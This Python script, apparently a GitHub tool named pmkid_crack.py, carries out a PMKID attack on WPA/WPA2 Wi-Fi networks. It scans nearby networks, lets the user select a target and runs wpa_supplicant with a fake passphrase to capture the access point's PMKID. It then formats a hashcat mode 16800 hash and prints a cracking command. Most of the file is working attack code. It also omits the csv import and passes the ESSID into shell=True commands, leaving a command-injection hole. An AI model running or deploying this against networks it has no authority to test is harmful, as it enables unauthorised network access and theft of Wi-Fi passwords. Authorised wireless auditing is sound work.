#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import subprocess
import binascii
import time
import datetime
import os
import re
import codecs


try:    import argparse
except: print('argparse required, run: pip install argparse');     sys.exit(1)
try:    import pexpect
except: print('pexpect required, run: pip install pexpect');      sys.exit(1)
try:    import netifaces
except: print('netifaces required, run: pip install netifaces');    sys.exit(1)


def get_time():
    return datetime.datetime.strftime(datetime.datetime.now(),'[%m-%d %H:%M:%S]')


# class taken from (and edited)
# https://github.com/drygdryg/OneShot/blob/master/oneshot.py
class WiFiScanner():
    """docstring for WiFiScanner"""
    def __init__(self, interface):
        self.interface = interface

        reports_fname = os.path.dirname(os.path.realpath(__file__)) + '/reports/stored.csv'
        try:
            with open(reports_fname, 'r', newline='', encoding='utf-8', errors='replace') as file:
                csvReader = csv.reader(file, delimiter=';', quoting=csv.QUOTE_ALL)
                # Skip header
                next(csvReader)
                self.stored = []
                for row in csvReader:
                    self.stored.append(
                        (
                            row[1],   # BSSID
                            row[2]    # ESSID
                        )
                    )
        except FileNotFoundError:
            self.stored = []

    def iw_scanner(self):
        '''Parsing iw scan results'''
        def handle_network(line, result, networks):
            networks.append(
                    {
                        'Security type': 'Unknown',
                        'WPS': False,
                        'WPS locked': False,
                        'Model': '',
                        'Model number': '',
                        'Device name': ''
                     }
                )
            networks[-1]['BSSID'] = result.group(1).upper()

        def handle_essid(line, result, networks):
            d = result.group(1)
            networks[-1]['ESSID'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        def handle_level(line, result, networks):
            networks[-1]['Level'] = int(float(result.group(1)))

        def handle_securityType(line, result, networks):
            sec = networks[-1]['Security type']
            if result.group(1) == 'capability':
                if 'Privacy' in result.group(2):
                    sec = 'WEP'
                else:
                    sec = 'Open'
            elif sec == 'WEP':
                if result.group(1) == 'RSN':
                    sec = 'WPA2'
                elif result.group(1) == 'WPA':
                    sec = 'WPA'
            elif sec == 'WPA':
                if result.group(1) == 'RSN':
                    sec = 'WPA/WPA2'
            elif sec == 'WPA2':
                if result.group(1) == 'WPA':
                    sec = 'WPA/WPA2'
            networks[-1]['Security type'] = sec

        def handle_wps(line, result, networks):
            networks[-1]['WPS'] = result.group(1)

        def handle_wpsLocked(line, result, networks):
            flag = int(result.group(1), 16)
            if flag:
                networks[-1]['WPS locked'] = True

        def handle_model(line, result, networks):
            d = result.group(1)
            networks[-1]['Model'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        def handle_modelNumber(line, result, networks):
            d = result.group(1)
            networks[-1]['Model number'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        def handle_deviceName(line, result, networks):
            d = result.group(1)
            networks[-1]['Device name'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        cmd = 'iw dev {} scan'.format(self.interface)
        proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                              stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
        lines = proc.stdout.splitlines()
        networks = []
        matchers = {
            re.compile(r'BSS (\S+)( )?\(on \w+\)'): handle_network,
            re.compile(r'SSID: (.*)'): handle_essid,
            re.compile(r'signal: ([+-]?([0-9]*[.])?[0-9]+) dBm'): handle_level,
            re.compile(r'(capability): (.+)'): handle_securityType,
            re.compile(r'(RSN):\t [*] Version: (\d+)'): handle_securityType,
            re.compile(r'(WPA):\t [*] Version: (\d+)'): handle_securityType
        }

        for line in lines:
            if line.startswith('command failed:'):
                print('[!] Error:', line)
                return False
            line = line.strip('\t')
            for regexp, handler in matchers.items():
                res = re.match(regexp, line)
                if res:
                    handler(line, res, networks)

        if not networks:
            return False

        # Sorting by signal level
        networks.sort(key=lambda x: x['Level'], reverse=True)

        # Printing scanning results as table
        def truncateStr(s, length, postfix='…'):
            '''
            Truncate string with the specified length
            @s — input string
            @llength — length of output string
            '''
            if len(s) > length:
                k = length - len(postfix)
                s = s[:k] + postfix
            return s

        def colored(text, color=None):
            '''Returns colored text'''
            if color:
                if color == 'yellow':
                    text = '\033[93m{}\033[00m'.format(text)
                else:
                    return text
            else:
                return text
            return text
        print('Networks list:')
        print('{:<4} {:<18} {:<25} {:<8} {:<4}'.format(
            '#', 'BSSID', 'ESSID', 'Sec.', 'PWR'))
        for i, network in enumerate(networks):
            number = '{})'.format(i + 1)
            essid = truncateStr(network['ESSID'], 25)
            line = '{:<4} {:<18} {:<25} {:<8} {:<4}'.format(
                number, network['BSSID'], essid,
                network['Security type'], network['Level'],
                )
            if (network['BSSID'], network['ESSID']) in self.stored:
                print(colored(line, color='yellow'))
            else:
                print(line)

        return networks

    def prompt_network(self):
        networks = self.iw_scanner()
        if not networks:
            print('[-] No networks found.')
            return
        while 1:
            try:
                networkNo = input('Select target (press Enter to refresh): ')
                if networkNo.lower() in ('r', '0', ''):
                    return self.prompt_network()
                elif int(networkNo) in range(1, len(networks) + 1):
                    selected = networks[int(networkNo) - 1]
                    return [selected['BSSID'], selected['ESSID']]
                else:
                    raise IndexError
            except Exception:
                print('Invalid number')
            else:
                break




#----------------------------------------------------------------------------------
def print_usage():
    result  =   "pmkid_crack.py"+"\n"
    result  +=  "2018-08-11, github.com/glezo1"+"\n\n"
    result  +=  "2020-10-05, github.com/eda-abec"+"\n\n"
    result  +=  "[-h] | [--help]       display this help"+"\n"
    result  +=  "[-v] | [--version]    show version"+"\n"
    result  +=  "-i   | --interface    managed-mode interface to be used"+"\n"
    result  +=  "[-b] | [--bssid]      target BSSID"+"\n"
    result  +=  "[-e] | [--essid]      target ESSID"+"\n"
    result  +=  "[-t] | [--timeout]    max seconds to wait for a PMKID.         Defaults to 30"+"\n"
    result  +=  "[-f] | [--file]       tmp file: wpa_supplicant and PMKID hash. Defaults to ./wpa_passphrase.cnf"+"\n"
    result  +=  "[-c] | [--crack]      crack by haschat (or not).               Defaults to 'do-not-crack'"+"\n"
    result  +=  "[-d] | [--dictionary] dictionary file to be used by hashcat"+"\n"
    result  +=  "[-m] | [--mask]       hashcat mask"+"\n"
    result  +=  "[-p] | [--password]   foo password used by wpa_supplicant.     Defaults to 'spameggs'"+"\n"
    result  +=  "\n"
    result  +=  "If -c is specified, hashcat will be called. Otherwise, PMKID hash (if any) will just be displayed"+"\n"
    result  +=  "If -c is specified, PMKID output hash will be stored in -f value, and -d or -m needs to be specified"+"\n"
    result  +=  "\n"
    result  +=  "\n"
    result  +=  "hashcat version cannot easily be infered. Depending on how it was installed, hashcat -V could display"+"\n"
    result  +=  "    2.0"+"\n"
    result  +=  "    v4.2.1-4-g188a956"+"\n"
    result  +=  "    pull/1273/head"+"\n"
    result  +=  "    etc, so be sure your version is >= 4.2.0"+"\n"
    
    print(result)


#-----------------------------------------------------------------------------------
if(__name__=='__main__'):
    current_version =   '0.1.1'
    
    
    parser       = argparse.ArgumentParser(usage=None, add_help=False)
    parser.add_argument('-h','--help'      ,action='store_true',default=False                 ,dest='help'      ,required=False)
    parser.add_argument('-v','--version'   ,action='store_true',default=False                 ,dest='version'   ,required=False)
    parser.add_argument('-i','--interface' ,action='store'     ,default=None                  ,dest='iface'     ,required=True )
    parser.add_argument('-b','--bssid'     ,action='store'     ,default=None                  ,dest='bssid'     ,required=False)
    parser.add_argument('-e','--essid'     ,action='store'     ,default=None                  ,dest='essid'     ,required=False)
    parser.add_argument('-t','--timeout'   ,action='store'     ,default=30                    ,dest='max_time'  ,required=False)
    parser.add_argument('-c','--crack'     ,action='store_true',default=None                  ,dest='crack'     ,required=False)
    parser.add_argument('-d','--dictionary',action='store'     ,default=None                  ,dest='dictionary',required=False)
    parser.add_argument('-f','--file'      ,action='store'     ,default='./wpa_passphrase.cnf',dest='file'      ,required=False)
    parser.add_argument('-m','--mask'      ,action='store'     ,default=None                  ,dest='mask'      ,required=False)
    parser.add_argument('-p','--password'  ,action='store'     ,default='spameggs'            ,dest='password'  ,required=False)
    
    
    args                        =   parser.parse_args()
    
    option_help                 =   args.help
    option_version              =   args.version
    iface                       =   args.iface
    bssid                       =   args.bssid
    essid                       =   args.essid
    max_time                    =   args.max_time
    tmp_file                    =   args.file
    wpa_supplicant_password     =   args.password
    crack                       =   args.crack
    password_dictionary_file    =   args.dictionary
    password_mask               =   args.mask

    
    if(option_version):
        print(current_version)
        sys.exit(0)
    elif(option_help):
        print_usage()
        sys.exit(0)
    else:
        if(crack==True and ((password_dictionary_file==None and password_mask==None) or (password_dictionary_file!=None and password_mask!=None))):
            print_usage()
            print('If -c|--crack is specified, -d|--dictionary XOR -m|--mask must be specified as well')
            sys.exit(1)
    
    try:
        if bssid == None and essid == None:
            scanner = WiFiScanner(iface)
            bssid, essid = scanner.prompt_network()
            print("")
    except KeyboardInterrupt:
        print("\nAborting…")
        sys.exit(0)
    
    bssid_hex           =   bssid.replace(':','').replace('-','').upper()
    essid_hex           =   binascii.hexlify(essid.encode('utf-8')).upper()
    available_ifaces    =   netifaces.interfaces()
    if(iface not in available_ifaces):
        print('selected interface "' + iface + '" doesn\'t exist: ' + str(available_ifaces))
        sys.exit(1)
    iface_mac           =   netifaces.ifaddresses(iface)[netifaces.AF_LINK][0]['addr'].replace(':','').upper()


    # 1) call wpa_passphrase to generate wpa_supplicant file; with foo password
    parameter_list          =   ['wpa_passphrase', essid,wpa_supplicant_password, '>', tmp_file]
    parameter_list_string   =   ' '.join(parameter_list)
    print('{} calling wpa_passphrase as:\n\t{}'.format(get_time(), parameter_list_string))
    try:    subprocess.check_output(parameter_list_string, shell=True)   # shel=True ===> arg must be string, not list
    except: pass

    time_pmkid_start        =   None
    time_pmkid_end          =   None
    time_hashcat_start      =   None
    time_hashcat_end        =   None
    
    # 2) call wpa_supplicant to retrieve the PMKID
    time_pmkid_start        =   time.time()
    parameter_list          =   ['wpa_supplicant', '-c', tmp_file, '-i', iface, '-dd']
    parameter_list_string   =   ' '.join(parameter_list)
    cmd_output              =   None
    print('{} calling wpa_supplicant as:\n\t{}'.format(get_time(), parameter_list_string))
    
    
    
    pmkid_found             =   False
    whole_hash              =   None
    child                   =   pexpect.spawn(parameter_list_string, timeout=int(max_time))
    try:
        child.expect('.*PMKID from Authenticator.*')
        print('{} PMKID retrieved!'.format(get_time()))
        child.sendcontrol('c')
        pmkid_found = True
    except pexpect.exceptions.EOF:
        print('{} did not receive PMKID'.format(get_time()))
        sys.exit(2)
    except pexpect.exceptions.TIMEOUT:
        print('{} timeout'.format(get_time()))
        print("Note: you can change the limit with -t <seconds>")
        sys.exit(3)
    except KeyboardInterrupt:
        print("\nAborting…")
        sys.exit(0)
    except Exception:
        pass
    if(pmkid_found == True):
        cmd_output = child.after
    else:
        cmd_output = child.before
    
    
    cmd_output          =   cmd_output.decode('utf-8')
    cmd_output_lines    =   cmd_output.split('\n')
    for current_line in cmd_output_lines:
        current_line = current_line.strip()
        if('RSN: PMKID from Authenticator - hexdump' in current_line):
            hex_pmkid   =   current_line.split(':')[2].replace(' ','').upper()
            whole_hash  =   hex_pmkid + '*' + bssid_hex + '*' + iface_mac + '*' + essid_hex.decode('utf-8')
            print('\n{}\n'.format(whole_hash))
            break
    
    pmkid_time_elapsed  = time.time() - time_pmkid_start
    print('{} PMKID request finished in {} s'.format(get_time(), '%.3f'%(pmkid_time_elapsed)))
    
    if pmkid_found == False or crack == None:
        print('{} DONE!'.format(get_time()))
    else:
        # copy the pmkid whole hash to the -f file
        with open(tmp_file, 'w') as fd_hash_file:
            fd_hash_file.write(whole_hash)
        print('TODO! should call hashcat such as')
        print('hashcat -m 16800 ' + tmp_file + ' <dictionary_file>|<mask>')
           
        print('{} DONE!'.format(get_time()))

